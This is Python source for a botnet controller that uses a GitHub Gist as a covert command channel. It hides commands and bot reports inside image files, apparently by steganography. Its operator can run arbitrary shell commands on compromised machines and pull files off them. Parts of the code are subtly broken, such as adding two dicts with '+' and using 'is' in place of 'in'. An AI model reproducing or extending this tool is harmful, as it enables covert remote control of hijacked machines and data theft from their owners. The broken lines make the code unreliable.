import argparse
import os
import select
import shutil
import sys
from typing import Optional, Any, Dict, Union
import time

from common import \
    GithubGistClient, \
    IMAGES_LIBRARY, \
    CONTROL_IMAGE, \
    UPDATE_INTERVAL, \
    KEEP_ALIVE_TIMEOUT, \
    now_ms, \
    is_image, \
    decode_data, \
    encode_data


class Controller:

    def __init__(
        self,
        workdir: str,
        gist: str,
        token: str,
        author: Optional[str] = None,
        recreate_workdir: bool = False,
        skip_init_reset: bool = False,
        skip_init_pull: bool = False,
    ) -> None:
        self._workdir = os.path.abspath(workdir)
        self._gist = gist
        self._token = token
        self._recreate_workdir = recreate_workdir
        self._skip_init_reset = skip_init_reset
        self._skip_init_pull = skip_init_pull

        self._lib_client = GithubGistClient(
            gist=IMAGES_LIBRARY,
            repo_dir=os.path.join(self._workdir, 'lib'),
        )

        self._comm_client = GithubGistClient(
            gist=self._gist,
            token=self._token,
            repo_dir=os.path.join(self._workdir, 'comm'),
            author=author,
        )

    def _ensure_workdir(self) -> None:
        if os.path.isdir(self._workdir) and self._recreate_workdir:
            print(f'removing and re-creating workdir {self._workdir}...')
            shutil.rmtree(self._workdir)
        if not os.path.isdir(self._workdir):
            os.makedirs(self._workdir)
        os.chdir(self._workdir)
        print(f'workdir ready and set as the process current working dir')

    def _setup(self) -> None:
        self._ensure_workdir()

        print('initializing images library to...')
        self._lib_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )
        self._load_lib_images()

        print(
            f'initializing the gist from {self._comm_client.get_https_url(with_token=False)}'
            f' to {self._comm_client.get_repo_dir()} ...'
        )
        self._comm_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )

        self._current_timestamp = now_ms()
        self._bots = {}
        self._pending_commands = {}

        pass

    def run(self) -> None:
        self._setup()

        while True:
            self._update_state()
            print(
                '\nEnter a command. Use ? or help to show help.\n'
                f'Auto update in {UPDATE_INTERVAL} seconds. Press enter to force update.\n'
                '> ',
                end='',
            )
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                # do not remove trailing whitespace except newline chars
                cmd_str = sys.stdin.readline().lstrip().rstrip('\r\n')
                self._process_command(cmd_str)
            else:
                # so we do not write to the prompt line
                # note: we could also use ASCII ESC sequences to clear the prompt (and add colors as well)
                print('')

        pass

    @staticmethod
    def stop() -> None:
        print('Stopping the controller. Note that the bots might still be running.')
        print('Use terminate command to stop a specific bot.')

    def _update_bot(self, name: str, data: Any) -> bool:
        print(f'trying update bot {name}', data)

        if not isinstance(data, dict):
            return False
        if 'last_update' not in data or not isinstance(data['last_update'], int):
            return False
        last_update = data['last_update']
        if (self._current_timestamp - last_update) > KEEP_ALIVE_TIMEOUT:
            if name is self._bots:
                print(f'bot {name} timed out, removing')
                del self._bots[name]
                del self._pending_commands[name]
                return False

        if name not in self._bots:
            bot = {
                'last_update': last_update,
                'cmd': None,
            }
            self._bots[name] = bot
            self._pending_commands[name] = None
        else:
            self._bots[name]['last_update'] = last_update

        pending_cmd = self._bots[name]['cmd']

        if pending_cmd is not None:
            result = data['result'] if 'result' in data and isinstance(data['result'], dict) else None
            result_id = result['id'] if 'id' in result and isinstance(result['id'], str) else None

            if pending_cmd['id'] == result_id:
                print('command finished')

                result_timestamp = \
                    result['timestamp'] if 'timestamp' in result and isinstance(result['timestamp'], str) else None
                result_exit_code = \
                    result['exit_code'] if 'exit_code' in result and isinstance(result['exit_code'], str) else None
                result_stdout = result['stdout'] if 'stdout' in result and isinstance(result['stdout'], str) else None
                result_stderr = result['stderr'] if 'stderr' in result and isinstance(result['stderr'], str) else None

                print(f'exit_code={result_exit_code}')
                print(result_stdout)
                print(result_stderr)

                self._bots[name]['cmd'] = None
                self._pending_commands[name] = None

        return True

    def _update_state(self) -> None:
        print('updating state ...')
        self._current_timestamp = now_ms()

        self._comm_client.pull_changes()

        data_files = set(filter(lambda f: f != CONTROL_IMAGE and is_image(f), os.listdir('comm')))

        for bot_name in data_files:
            # TODO: consider handling exceptions and removing invalid files instead of just crashing
            bot_data = decode_data('comm/' + bot_name)
            if not self._update_bot(bot_name, bot_data):
                print(f'removing {bot_name}')
                os.remove('comm/' + bot_name)
                self._comm_client.add([bot_name])

        # handles case when the bot's file is gone,
        # but we have still record in the memory
        bots_to_delete = []
        for bot_name, bot in self._bots.items():
            print(bot_name, bot, (self._current_timestamp - bot['last_update']) // 1000)
            if (self._current_timestamp - bot['last_update']) > KEEP_ALIVE_TIMEOUT:
                print(f'bot {bot_name} timed out, removing')
                bots_to_delete.append(bot_name)
                # cannot delete here during the dict iteration
            elif not os.path.exists('comm/' + bot_name):
                print(f'bot image {bot_name} does not exist, removing bot')
                bots_to_delete.append(bot_name)
        for bot_name in bots_to_delete:
            del self._bots[bot_name]
            del self._pending_commands[bot_name]
            if os.path.exists('comm/' + bot_name):
                os.remove('comm/' + bot_name)
                self._comm_client.add([bot_name])

        encode_data(
            image_file='lib/' + CONTROL_IMAGE,
            data=self._pending_commands,
            output_file='comm/' + CONTROL_IMAGE,
        )
        self._comm_client.add([CONTROL_IMAGE])

        self._comm_client.commit_and_push_if_needed()

        pass

    def _load_lib_images(self):
        self._lib_images = set(filter(is_image, os.listdir('lib')))
        print(f'library contains {len(self._lib_images)} images:')
        for img in self._lib_images:
            print(f'  {img}')
        if CONTROL_IMAGE not in self._lib_images:
            raise RuntimeError(f'Control image {CONTROL_IMAGE} is not the library!')

    def _print_bots(self) -> None:
        print('Bots:')
        print(self._bots)
        pass

    def _is_valid_bot(self, bot: str) -> bool:
        return bot in self._bots

    # COMMANDS

    # noinspection PyMethodMayBeStatic
    def _generate_new_command_id(self) -> str:
        return os.urandom(16).hex()

    def _create_command(self, name: str, args: Dict[str, Union[str, bool, int]]) -> Dict[str, Union[str, bool, int]]:
        header = {
            'id': self._generate_new_command_id(),
            'timestamp': time.time_ns() // 1000,  # epoch in milliseconds
            'name': name,
        }
        return header + args

    def _set_command(self, bot: str, cmd: Dict[str, Union[str, bool, int]]) -> None:
        self._bots[bot]['cmd'] = cmd
        self._pending_commands[bot] = cmd
        return

    @staticmethod
    def _print_help() -> None:
        print(
            '\nAvailable commands:\n\n'
            'Use Ctrl-C to stop and exit the controller.\n\n'
            'help\n'
            '  Prints this help.\n'
            'bots\n'
            '  Lists all bots and their status.\n'
            'terminate <bot>\n'
            '  Terminates the bot.\n'
            'shell <bot> <command>\n'
            '  Runs the given command on the bot using the following Python code.\n'
            '    subprocess.run(args=[<command>], shell=True)\n'
            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
            'run <bot> <command>\n'
            '  Runs the given command on the bot using the following Python code.\n'
            '    subprocess.run(args=shlex.split(<command>), shell=False)\n'
            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
            'copyFrom <bot> <file name>\n'
            'do <bot> id\n'
            '  Alias for shell <bot> id\n'
            'do <bot> who\n'
            '  Alias for shell <bot> who\n'
            'do <bot> ls <path>\n'
            '  Alias for shell <bot> ls -lha\n'
        )

    def _process_terminate_command(self, bot) -> None:
        self._set_command(bot, self._create_command(
            name='terminate',
            args={},
        ))
        pass

    def _process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
        if cmd is None:
            print('Missing <command> argument!')
            return
        if cmd == '':
            print('Invalid empty <command> argument!')
            return
        self._set_command(bot, self._create_command(
            name='run',
            args={
                'shell': shell,
                'cmd': cmd,
            },
        ))
        pass

    def _process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
        if file_name is None:
            print('Missing <file name> argument!')
            return
        if file_name == '':
            print('Invalid empty <file name> argument!')
            return
        self._set_command(bot, self._create_command(
            name='copy_from',
            args={
                'file_name': file_name,
            },
        ))
        pass

    def _process_do_command(self, bot, action: Optional[str]) -> None:
        if action is None:
            print('Missing do action!')
            return
        if action == 'id':
            self._process_run_command(bot, shell=True, cmd='id')
            return
        if action == 'who':
            self._process_run_command(bot, shell=True, cmd='who')
            return
        if action.startswith('ls '):
            path = action[3:]
            if path == '':
                print(f"Invalid path '{path}'!")
                return
            self._process_run_command(bot, shell=True, cmd='ls -lha ' + path)
            return
        print(f"Invalid do action '{action}'!")
        return

    def _process_command(self, cmd_str) -> None:
        if cmd_str == '':
            # no command
            return

        parts = cmd_str.split(sep=' ', maxsplit=1)
        cmd_name = parts[0]

        if cmd_name == 'help' or cmd_name == '?':
            self._print_help()
            return

        if cmd_name == 'bots':
            self._print_bots()
            return

        # all other commands should have format <cmd_name> <bot> <...the rest>
        if len(parts) == 2:
            sub_parts = parts[1].split(sep=' ', maxsplit=1)
            bot = sub_parts[0]
            args_str = sub_parts[1] if len(sub_parts) == 2 else None
            if not self._is_valid_bot(bot):
                print(f"Command '{cmd_str}'")
                print(f"Invalid bot '{bot}' given.")
                return

            if cmd_name == 'terminate':
                self._process_terminate_command(bot)
                return
            if cmd_name == 'shell':
                self._process_run_command(bot, shell=True, cmd=args_str)
                return
            if cmd_name == 'run':
                self._process_run_command(bot, shell=False, cmd=args_str)
                return
            if cmd_name == 'copyFrom':
                self._process_copy_from_command(bot, file_name=args_str)
                return
            if cmd_name == 'do':
                self._process_do_command(bot, action=args_str)
                return

        print(f"Invalid or unknown command '{cmd_str}'!")
        print(f'Type ? or help to show help.')

    pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--author',
        help='Override default git commit author',
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='Remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='Skip resetting the git repos if they already exist.',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='Skip updating the git repos if they already exist.',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='Shortcut for combination of of --skip-init-reset and --skip-init-pull.',
    )
    _args = _parser.parse_args()
    _controller = Controller(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        author=_args.author,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _controller.run()
    except KeyboardInterrupt:
        _controller.stop()
